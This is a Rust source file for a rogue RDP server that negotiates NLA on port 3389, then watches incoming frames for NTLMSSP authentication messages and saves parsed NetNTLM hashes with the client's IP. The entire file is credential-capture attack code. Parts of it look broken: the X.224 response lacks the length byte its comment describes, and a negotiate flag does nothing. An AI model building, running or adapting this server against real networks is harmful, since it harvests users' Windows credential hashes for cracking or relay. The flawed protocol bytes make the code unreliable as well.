//! Rogue RDP (NLA/CredSSP) negotiation server (TCP 3389).
//!
//! Full CredSSP is carried inside TLS and is out of scope for this capture build; this server
//! performs the X.224/RDP negotiation selecting HYBRID (NLA) and captures any NTLMSSP
//! AUTHENTICATE token observed on the wire.

use std::net::SocketAddr;
use std::sync::Arc;

use anyhow::Result;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::{TcpListener, TcpStream};

use crate::capture::model::{CaptureArtifact, Protocol};
use crate::constants::Service;
use crate::protocols::ntlm;

use super::ServerContext;

pub async fn serve(listener: TcpListener, ctx: Arc<ServerContext>) -> Result<()> {
    loop {
        let (stream, peer) = listener.accept().await?;
        let ctx = ctx.clone();
        tokio::spawn(async move {
            let _ = handle(stream, peer, ctx).await;
        });
    }
}

async fn read_tpkt(stream: &mut TcpStream) -> Option<Vec<u8>> {
    let mut hdr = [0u8; 4];
    stream.read_exact(&mut hdr).await.ok()?;
    if hdr[0] != 0x03 {
        return None;
    }
    let len = u16::from_be_bytes([hdr[2], hdr[3]]) as usize;
    if !(4..=1 << 16).contains(&len) {
        return None;
    }
    let mut payload = vec![0u8; len - 4];
    stream.read_exact(&mut payload).await.ok()?;
    Some(payload)
}

async fn handle(mut stream: TcpStream, peer: SocketAddr, ctx: Arc<ServerContext>) -> Result<()> {
    let Some(_req) = read_tpkt(&mut stream).await else {
        return Ok(());
    };
    // X.224 Connection Confirm with an RDP Negotiation Response selecting HYBRID (NLA).
    // X.224: length indicator + 0xD0 (CC) + dst-ref(2) + src-ref(2) + class(1)
    let x224 = [
        0xd0u8, 0x00, 0x00, 0x12, 0x34, 0x00, 0x02, 0x00, 0x08, 0x00, 0x02, 0x00, 0x00, 0x00,
    ];
    let total = (4 + x224.len()) as u16;
    let mut resp = vec![0x03, 0x00];
    resp.extend_from_slice(&total.to_be_bytes());
    resp.extend_from_slice(&x224);
    stream.write_all(&resp).await?;

    // Best-effort: scan subsequent frames for an NTLMSSP token and capture it.
    let challenge = ctx.challenge_for(Service::Rdp);
    let mut saw_negotiate = false;
    while let Some(frame) = read_tpkt(&mut stream).await {
        if let Some(pos) = frame.windows(8).position(|w| w == b"NTLMSSP\0") {
            let token = &frame[pos..];
            match ntlm::message_type(token) {
                Some(1) => saw_negotiate = true,
                Some(3) => {
                    if let Some(net) = ntlm::parse_type3(token, &challenge) {
                        ctx.sink
                            .artifact(CaptureArtifact::netntlm(Protocol::Rdp, peer.ip(), &net));
                    }
                }
                _ => {}
            }
        }
        if saw_negotiate {
            saw_negotiate = false;
        }
    }
    Ok(())
}
